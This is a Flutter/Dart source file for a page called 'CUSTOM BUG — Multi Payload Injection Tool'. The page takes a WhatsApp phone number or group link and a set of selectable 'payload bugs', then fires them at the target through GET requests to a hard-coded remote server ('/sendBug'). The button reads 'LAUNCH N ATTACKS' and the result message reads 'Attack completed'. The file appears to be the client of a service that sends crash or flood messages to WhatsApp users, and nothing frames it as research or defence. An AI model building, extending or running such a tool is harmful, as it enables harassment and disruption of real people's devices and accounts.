import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;

class CustomBugPage extends StatefulWidget {
  final String username;
  final String password;
  final String sessionKey;
  final List<Map<String, dynamic>> listBug;
  final String role;
  final String expiredDate;

  const CustomBugPage({
    super.key,
    required this.username,
    required this.password,
    required this.sessionKey,
    required this.listBug,
    required this.role,
    required this.expiredDate,
  });

  @override
  State<CustomBugPage> createState() => _CustomBugPageState();
}

class _CustomBugPageState extends State<CustomBugPage> with TickerProviderStateMixin {
  final targetController = TextEditingController();
  late AnimationController _pulseController;
  
  // Multiple selection payload
  List<String> selectedBugIds = [];
  
  // Mode Target: 'number' atau 'group'
  String _selectedBugMode = "number";

  bool _isSending = false;
  String? _responseMessage;

  // --- TEMA XYRIS: HITAM DEEP + EMAS ---
  final Color bgDark = const Color(0xFF0A0A0A);
  final Color surfaceDark = const Color(0xFF1A1A1A);
  final Color cardDark = const Color(0xFF1E1E1E);
  final Color accentGold = const Color(0xFFF5A623);
  final Color accentGoldLight = const Color(0xFFFFD700);
  final Color textWhite = Colors.white;
  final Color textGrey = const Color(0xFF888888);
  final Color borderDark = const Color(0xFF2A2A2A);

  @override
  void initState() {
    super.initState();
    _pulseController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 1500),
    )..repeat(reverse: true);

    // Select first 3 bugs by default (or all if less than 3)
    if (widget.listBug.isNotEmpty) {
      selectedBugIds = widget.listBug
          .take(3)
          .map((bug) => bug['bug_id'].toString())
          .toList();
    }
  }

  @override
  void dispose() {
    _pulseController.dispose();
    targetController.dispose();
    super.dispose();
  }

  String? formatPhoneNumber(String input) {
    final cleaned = input.replaceAll(RegExp(r'[^\d+]'), '');
    if (!cleaned.startsWith('+') || cleaned.length < 8) return null;
    return cleaned;
  }

  bool isValidGroupLink(String input) {
    return input.contains('chat.whatsapp.com') && input.contains('https://');
  }

  void _toggleBugSelection(String bugId) {
    setState(() {
      if (selectedBugIds.contains(bugId)) {
        selectedBugIds.remove(bugId);
      } else {
        selectedBugIds.add(bugId);
      }
    });
  }

  Future<void> _sendMultipleBugs() async {
    final rawInput = targetController.text.trim();
    final key = widget.sessionKey;

    if (selectedBugIds.isEmpty) {
      _showAlert("No Payload Selected", "Please select at least one payload bug.");
      return;
    }

    if (_selectedBugMode == "number") {
      final target = formatPhoneNumber(rawInput);
      if (target == null || key.isEmpty) {
        _showAlert("Invalid Number", "Use international format (e.g. +62xxx)");
        return;
      }
    } else {
      if (!isValidGroupLink(rawInput)) {
        _showAlert("Invalid Link", "Enter valid WhatsApp group link");
        return;
      }
    }

    setState(() {
      _isSending = true;
      _responseMessage = null;
    });

    int successCount = 0;
    int failCount = 0;
    List<String> results = [];

    // Send each selected bug
    for (String bugId in selectedBugIds) {
      try {
        final res = await http.get(Uri.parse(
            "http://arkzzxrizz.private.omdhancivok.my.id:2152/sendBug?key=$key&target=$rawInput&bug=$bugId"));
        final data = jsonDecode(res.body);

        if (data["sended"] == true) {
          successCount++;
          final bugName = widget.listBug.firstWhere((b) => b['bug_id'].toString() == bugId)['bug_name'];
          results.add("✅ $bugName: Success");
        } else {
          failCount++;
          final bugName = widget.listBug.firstWhere((b) => b['bug_id'].toString() == bugId)['bug_name'];
          results.add("❌ $bugName: Failed");
        }
        
        // Delay between requests to avoid rate limiting
        await Future.delayed(const Duration(milliseconds: 500));
      } catch (e) {
        failCount++;
        final bugName = widget.listBug.firstWhere((b) => b['bug_id'].toString() == bugId)['bug_name'];
        results.add("⚠️ $bugName: Error");
      }
    }

    setState(() {
      _isSending = false;
      if (successCount > 0) {
        _responseMessage = "✅ Attack completed! Success: $successCount, Failed: $failCount\n\n${results.join('\n')}";
        targetController.clear();
      } else {
        _responseMessage = "❌ All attacks failed!";
      }
    });
  }

  void _showAlert(String title, String msg) {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: surfaceDark,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20),
          side: BorderSide(color: accentGold.withOpacity(0.3)),
        ),
        title: Text(
          title,
          style: const TextStyle(
            color: Color(0xFFF5A623),
            fontFamily: 'Orbitron',
            fontWeight: FontWeight.bold,
            fontSize: 18,
          ),
        ),
        content: Text(
          msg,
          style: TextStyle(
            color: textGrey,
            fontFamily: 'ShareTechMono',
            fontSize: 14,
          ),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text(
              "OK",
              style: TextStyle(
                color: Color(0xFFF5A623),
                fontWeight: FontWeight.bold,
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildModeSelector() {
    return Container(
      padding: const EdgeInsets.all(4),
      decoration: BoxDecoration(
        color: surfaceDark,
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: borderDark),
      ),
      child: Row(
        children: [
          Expanded(
            child: GestureDetector(
              onTap: () {
                setState(() {
                  _selectedBugMode = "number";
                  targetController.clear();
                });
              },
              child: Container(
                padding: const EdgeInsets.symmetric(vertical: 14),
                decoration: BoxDecoration(
                  color: _selectedBugMode == "number"
                      ? accentGold
                      : Colors.transparent,
                  borderRadius: BorderRadius.circular(12),
                ),
                child: Row(
                  mainAxisAlignment: MainAxisAlignment.center,
                  children: [
                    Icon(
                      Icons.phone_android,
                      color: _selectedBugMode == "number" ? Colors.black : textGrey,
                      size: 20,
                    ),
                    const SizedBox(width: 8),
                    Text(
                      "BUG NOMOR",
                      style: TextStyle(
                        color: _selectedBugMode == "number" ? Colors.black : textGrey,
                        fontWeight: FontWeight.w700,
                        fontSize: 13,
                        fontFamily: 'Orbitron',
                        letterSpacing: 1,
                      ),
                    ),
                  ],
                ),
              ),
            ),
          ),
          Expanded(
            child: GestureDetector(
              onTap: () {
                setState(() {
                  _selectedBugMode = "group";
                  targetController.clear();
                });
              },
              child: Container(
                padding: const EdgeInsets.symmetric(vertical: 14),
                decoration: BoxDecoration(
                  color: _selectedBugMode == "group"
                      ? accentGold
                      : Colors.transparent,
                  borderRadius: BorderRadius.circular(12),
                ),
                child: Row(
                  mainAxisAlignment: MainAxisAlignment.center,
                  children: [
                    Icon(
                      Icons.groups,
                      color: _selectedBugMode == "group" ? Colors.black : textGrey,
                      size: 20,
                    ),
                    const SizedBox(width: 8),
                    Text(
                      "BUG GROUP",
                      style: TextStyle(
                        color: _selectedBugMode == "group" ? Colors.black : textGrey,
                        fontWeight: FontWeight.w700,
                        fontSize: 13,
                        fontFamily: 'Orbitron',
                        letterSpacing: 1,
                      ),
                    ),
                  ],
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildResponseMessage() {
    if (_responseMessage == null) return const SizedBox.shrink();

    Color bgColor;
    Color borderColor;
    Color textColor;
    IconData icon;

    if (_responseMessage!.startsWith('✅')) {
      bgColor = Colors.green.withOpacity(0.1);
      borderColor = Colors.greenAccent;
      textColor = Colors.greenAccent;
      icon = Icons.check_circle_outline;
    } else if (_responseMessage!.startsWith('❌')) {
      bgColor = Colors.red.withOpacity(0.1);
      borderColor = Colors.redAccent;
      textColor = Colors.redAccent;
      icon = Icons.error_outline;
    } else {
      bgColor = accentGold.withOpacity(0.1);
      borderColor = accentGold;
      textColor = accentGold;
      icon = Icons.info_outline;
    }

    return Padding(
      padding: const EdgeInsets.only(top: 20),
      child: Container(
        padding: const EdgeInsets.all(16),
        decoration: BoxDecoration(
          color: bgColor,
          borderRadius: BorderRadius.circular(14),
          border: Border.all(color: borderColor.withOpacity(0.3)),
        ),
        child: Row(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Icon(icon, color: textColor, size: 22),
            const SizedBox(width: 12),
            Expanded(
              child: Text(
                _responseMessage!,
                style: TextStyle(
                  color: textColor,
                  fontWeight: FontWeight.w600,
                  fontSize: 12,
                  fontFamily: 'ShareTechMono',
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: bgDark,
      body: SafeArea(
        child: SingleChildScrollView(
          padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 20),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              // TITLE
              const Center(
                child: Text(
                  "CUSTOM BUG",
                  style: TextStyle(
                    color: Colors.white,
                    fontSize: 22,
                    fontWeight: FontWeight.w900,
                    fontFamily: 'Orbitron',
                    letterSpacing: 3,
                  ),
                ),
              ),
              const SizedBox(height: 6),

              // SUBTITLE
              const Center(
                child: Text(
                  "Multi Payload Injection Tool",
                  style: TextStyle(
                    color: Color(0xFF888888),
                    fontSize: 12,
                    fontFamily: 'ShareTechMono',
                    letterSpacing: 0.5,
                  ),
                ),
              ),
              const SizedBox(height: 32),

              // MODE SELECTOR (BUG NOMOR / BUG GROUP)
              _buildModeSelector(),

              const SizedBox(height: 28),

              // TARGET LABEL
              Text(
                _selectedBugMode == "number" ? "TARGET NUMBER" : "TARGET GROUP LINK",
                style: const TextStyle(
                  color: Colors.white,
                  fontSize: 13,
                  fontWeight: FontWeight.w700,
                  fontFamily: 'Orbitron',
                  letterSpacing: 1.5,
                ),
              ),
              const SizedBox(height: 8),

              // TARGET INPUT WITH ICON
              Container(
                decoration: BoxDecoration(
                  color: surfaceDark,
                  borderRadius: BorderRadius.circular(12),
                  border: Border.all(color: borderDark),
                ),
                child: Row(
                  children: [
                    Container(
                      padding: const EdgeInsets.symmetric(horizontal: 16),
                      child: Icon(
                        Icons.phone_android_rounded,
                        color: textGrey.withOpacity(0.6),
                        size: 22,
                      ),
                    ),
                    Expanded(
                      child: TextField(
                        controller: targetController,
                        style: const TextStyle(color: Colors.white, fontSize: 14),
                        cursorColor: accentGold,
                        keyboardType: _selectedBugMode == "number" 
                            ? TextInputType.phone 
                            : TextInputType.url,
                        decoration: InputDecoration(
                          hintText: _selectedBugMode == "number"
                              ? "e.g. +628xxxxxxxxx"
                              : "e.g. https://chat.whatsapp.com/...",
                          hintStyle: TextStyle(
                            color: textGrey.withOpacity(0.6), 
                            fontSize: 13,
                          ),
                          filled: true,
                          fillColor: Colors.transparent,
                          border: OutlineInputBorder(
                            borderRadius: BorderRadius.circular(12),
                            borderSide: BorderSide.none,
                          ),
                          enabledBorder: OutlineInputBorder(
                            borderRadius: BorderRadius.circular(12),
                            borderSide: BorderSide.none,
                          ),
                          focusedBorder: OutlineInputBorder(
                            borderRadius: BorderRadius.circular(12),
                            borderSide: BorderSide.none,
                          ),
                          contentPadding: const EdgeInsets.symmetric(
                            vertical: 16, 
                            horizontal: 0,
                          ),
                        ),
                      ),
                    ),
                  ],
                ),
              ),

              const SizedBox(height: 28),

              // SELECT PAYLOAD BUG LABEL WITH COUNTER
              Row(
                mainAxisAlignment: MainAxisAlignment.spaceBetween,
                children: [
                  const Text(
                    "SELECT PAYLOAD BUG",
                    style: TextStyle(
                      color: Colors.white,
                      fontSize: 13,
                      fontWeight: FontWeight.w700,
                      fontFamily: 'Orbitron',
                      letterSpacing: 1.5,
                    ),
                  ),
                  Container(
                    padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
                    decoration: BoxDecoration(
                      color: accentGold.withOpacity(0.1),
                      borderRadius: BorderRadius.circular(20),
                      border: Border.all(color: accentGold.withOpacity(0.3)),
                    ),
                    child: Text(
                      "${selectedBugIds.length} SELECTED",
                      style: TextStyle(
                        color: accentGold,
                        fontSize: 11,
                        fontWeight: FontWeight.bold,
                        fontFamily: 'Orbitron',
                      ),
                    ),
                  ),
                ],
              ),
              const SizedBox(height: 12),

              // MULTIPLE BUG SELECTION (CHECKBOX LIST)
              Container(
                decoration: BoxDecoration(
                  color: surfaceDark,
                  borderRadius: BorderRadius.circular(12),
                  border: Border.all(color: borderDark),
                ),
                child: ListView.separated(
                  shrinkWrap: true,
                  physics: const NeverScrollableScrollPhysics(),
                  itemCount: widget.listBug.length,
                  separatorBuilder: (context, index) => Divider(
                    color: borderDark,
                    height: 1,
                  ),
                  itemBuilder: (context, index) {
                    final bug = widget.listBug[index];
                    final bugId = bug['bug_id'].toString();
                    final bugName = bug['bug_name'];
                    final isSelected = selectedBugIds.contains(bugId);
                    
                    return CheckboxListTile(
                      value: isSelected,
                      onChanged: (bool? value) {
                        _toggleBugSelection(bugId);
                      },
                      title: Text(
                        bugName,
                        style: const TextStyle(
                          color: Colors.white,
                          fontSize: 14,
                          fontFamily: 'ShareTechMono',
                        ),
                      ),
                      secondary: Container(
                        width: 40,
                        height: 40,
                        decoration: BoxDecoration(
                          color: isSelected ? accentGold.withOpacity(0.1) : Colors.transparent,
                          borderRadius: BorderRadius.circular(8),
                        ),
                        child: Icon(
                          Icons.bug_report,
                          color: isSelected ? accentGold : textGrey,
                          size: 20,
                        ),
                      ),
                      activeColor: accentGold,
                      checkColor: Colors.black,
                      controlAffinity: ListTileControlAffinity.trailing,
                      contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 4),
                    );
                  },
                ),
              ),

              const SizedBox(height: 16),

              // ACTION BUTTONS ROW
              Row(
                children: [
                  Expanded(
                    child: OutlinedButton.icon(
                      onPressed: () {
                        setState(() {
                          selectedBugIds = [];
                        });
                      },
                      icon: const Icon(Icons.clear_all, size: 18),
                      label: const Text("CLEAR ALL"),
                      style: OutlinedButton.styleFrom(
                        foregroundColor: Colors.redAccent,
                        side: BorderSide(color: Colors.redAccent.withOpacity(0.5)),
                        backgroundColor: Colors.red.withOpacity(0.05),
                        padding: const EdgeInsets.symmetric(vertical: 12),
                        shape: RoundedRectangleBorder(
                          borderRadius: BorderRadius.circular(10),
                        ),
                      ),
                    ),
                  ),
                  const SizedBox(width: 12),
                  Expanded(
                    child: OutlinedButton.icon(
                      onPressed: () {
                        setState(() {
                          selectedBugIds = widget.listBug
                              .take(3)
                              .map((bug) => bug['bug_id'].toString())
                              .toList();
                        });
                      },
                      icon: const Icon(Icons.select_all, size: 18),
                      label: const Text("SELECT 3"),
                      style: OutlinedButton.styleFrom(
                        foregroundColor: accentGold,
                        side: BorderSide(color: accentGold.withOpacity(0.5)),
                        backgroundColor: accentGold.withOpacity(0.05),
                        padding: const EdgeInsets.symmetric(vertical: 12),
                        shape: RoundedRectangleBorder(
                          borderRadius: BorderRadius.circular(10),
                        ),
                      ),
                    ),
                  ),
                  const SizedBox(width: 12),
                  Expanded(
                    child: OutlinedButton.icon(
                      onPressed: () {
                        setState(() {
                          selectedBugIds = widget.listBug
                              .take(5)
                              .map((bug) => bug['bug_id'].toString())
                              .toList();
                        });
                      },
                      icon: const Icon(Icons.select_all, size: 18),
                      label: const Text("SELECT 5"),
                      style: OutlinedButton.styleFrom(
                        foregroundColor: accentGold,
                        side: BorderSide(color: accentGold.withOpacity(0.5)),
                        backgroundColor: accentGold.withOpacity(0.05),
                        padding: const EdgeInsets.symmetric(vertical: 12),
                        shape: RoundedRectangleBorder(
                          borderRadius: BorderRadius.circular(10),
                        ),
                      ),
                    ),
                  ),
                ],
              ),

              const SizedBox(height: 36),

              // LAUNCH MULTI ATTACK BUTTON
              AnimatedBuilder(
                animation: _pulseController,
                builder: (context, child) {
                  return Container(
                    width: double.infinity,
                    height: 56,
                    decoration: BoxDecoration(
                      gradient: const LinearGradient(
                        colors: [Color(0xFFF5A623), Color(0xFFFFD700)],
                      ),
                      borderRadius: BorderRadius.circular(14),
                      boxShadow: [
                        BoxShadow(
                          color: accentGold.withOpacity(0.3 + _pulseController.value * 0.2),
                          blurRadius: 20 + (_pulseController.value * 10),
                          offset: const Offset(0, 8),
                        ),
                      ],
                    ),
                    child: Material(
                      color: Colors.transparent,
                      borderRadius: BorderRadius.circular(14),
                      child: InkWell(
                        onTap: _isSending ? null : _sendMultipleBugs,
                        borderRadius: BorderRadius.circular(14),
                        child: Center(
                          child: _isSending
                              ? const SizedBox(
                                  width: 24,
                                  height: 24,
                                  child: CircularProgressIndicator(
                                    strokeWidth: 2,
                                    color: Colors.black,
                                  ),
                                )
                              : Row(
                                  mainAxisAlignment: MainAxisAlignment.center,
                                  children: [
                                    const Icon(
                                      Icons.multiple_stop, 
                                      color: Colors.black, 
                                      size: 22
                                    ),
                                    const SizedBox(width: 10),
                                    Text(
                                      "LAUNCH ${selectedBugIds.length} ATTACKS",
                                      style: const TextStyle(
                                        color: Colors.black,
                                        fontWeight: FontWeight.w900,
                                        fontSize: 14,
                                        fontFamily: 'Orbitron',
                                        letterSpacing: 1.5,
                                      ),
                                    ),
                                  ],
                                ),
                        ),
                      ),
                    ),
                  );
                },
              ),

              // Response Message
              _buildResponseMessage(),

              const SizedBox(height: 24),
            ],
          ),
        ),
      ),
    );
  }
}